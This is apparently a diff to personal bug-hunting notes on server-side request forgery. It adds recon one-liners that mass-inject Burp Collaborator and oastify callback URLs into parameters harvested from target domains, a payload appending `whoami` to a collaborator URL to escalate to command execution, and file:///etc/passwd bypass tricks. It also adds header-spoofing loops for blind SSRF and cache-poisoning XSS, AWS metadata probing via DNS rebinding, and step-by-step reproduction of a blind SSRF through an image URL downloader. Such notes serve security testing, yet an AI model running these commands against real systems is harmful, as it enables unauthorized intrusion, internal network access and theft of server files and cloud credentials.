@@ -1,5 +1,4 @@
-
-    SSRF
+SSRF
     map the application
         identify any request parameter that contains hostnames, ip addresses or full url
                  
@@ -167,6 +166,14 @@ header('Location: http://127.0.0.1:8080/status');
         </foreignObject>
     </g>
 </svg>
+   
+   
+  /// sometimes it is possible to use other schemes and protocols in a SSRF attack other than HTTP. Examples of these are file://, phar://, gopher://, data://and dict://
+   
+
+
+
+
  
       TIPS 1 on ssrf
   1      gau -subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
@@ -175,12 +182,24 @@ header('Location: http://127.0.0.1:8080/status');
      and then ffuf
   3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
   
+  
   Now  check whether if we get any http request hit on our burp collaborator server
   
   if yes , escalate to Rce with burp collabator
     example https://url?burpcollabuarator?`payload`
   
   http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami` and check the link on your browers
+  
+    filter
+  cat sort.txt | grep ? | tee grep.txt  /// filltered out parameters
+  cat parameter.txt | grep -E *[.]js     filter out javascript
+  
+               SSRF ONELINER
+  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
+  cat subdomains.txt | dnsx | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://hacker.burpcollaborator.ne
+  
+       CHECK BLIND SSRF IN HEADER,PATH,HOST & CHECK XSS VIA WEB CACHE POISONING.
+   cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
   
   
   TIP 2 on ssrf 
@@ -193,6 +212,12 @@ header('Location: http://127.0.0.1:8080/status');
   check cors
    give to Burp Collaborator/ ngrok  instance to see if it would fetch my instance:
   bruteforce new endpoint and check for paths and directories  
+  
+  tip
+  SSRF are ❤️
+
+file:///etc/passwd : Not authorized
+file://\/\/etc/passwd : Work
   
   tip3 
    
@@ -224,6 +249,8 @@ header('Location: http://127.0.0.1:8080/status');
    
    http://canarytokens.com/traffic/wzjxrkmmgjd8em4swawz08eey/post.jsp /////
    
+   <img src="file :///C:\Program Files\Internet Explorer\images\bing.ico">
+   
    
   TIP6 
   some  application contains an open redirection vulnerability in which the following URL
@@ -247,7 +274,19 @@ header('Location: http://127.0.0.1:8080/status');
 
 5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
    
-   
+   SSRF METHODOLOGY BY AaKASH
+   look for subdomian by Amass, Sublist3r and subdomainer
+   check live subdomain
+   cat all-domains.txt | httpx > all-live.txt
+    find all the urls associated with the domains
+    cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
+    Injection Burp Collaborator URL in Parameters
+    cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
+    Test for SSRF Vulnerabilities
+   cat ssrf.txt | httpx -fr
+   If any url vulnerable to SSRF will be show in burp collaborator.
+    
+      
   
    
    
@@ -260,6 +299,30 @@ header('Location: http://127.0.0.1:8080/status');
    SSRF IN DNS REBRINDING
   set dns rebrinding to   127.0.0.1/google ip  or any other bypass and send many request with burp intruder and watch response that come back different lenght than others
   check if it is an aws metadata IP and try to  retrieve data from there by firing up burp intruder
+  
+  TIP
+  Blind SSRF via image upload URL downloader on 
+https://example{.}com
+
+Steps to Reproduce
+
+1.Create a one test account.
+2.Login to that account.
+3.Go to edit profile.
+4.Scroll down there.
+5.Notice user picture field.
+6. Try to upload something.
+7. You will see URL downloader.
+8. Open your burp collaborator client.
+9. Copy and paste the payload in URL downloader, make sure to include /test.png at the ending like this http://example.com/test.png
+10. Poll now in burp collaborator client.
+11.Notice HTTP and DNS interaction. IP address from HTTP interaction is from internal network which means we can do some middleware issues. Notice that it's fetching test.png file. And IP is from internal network.
+12.Turn your foxy proxy on and open your burp suite.
+13.Paste this ipv4 in URL downloader: http://127.0.0.1/test.png
+14.Intercept request. Request
+15. You will notice one error showing some info about server which confirms Blind SSRF again. 
+16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
+17.Also I was able to identify that your web app is using libcurl.
   
 
 
@@ -306,3 +369,4 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
       
       use httpx to keep track of the code
       cat hosttxt | httpx -title -status-code
+      
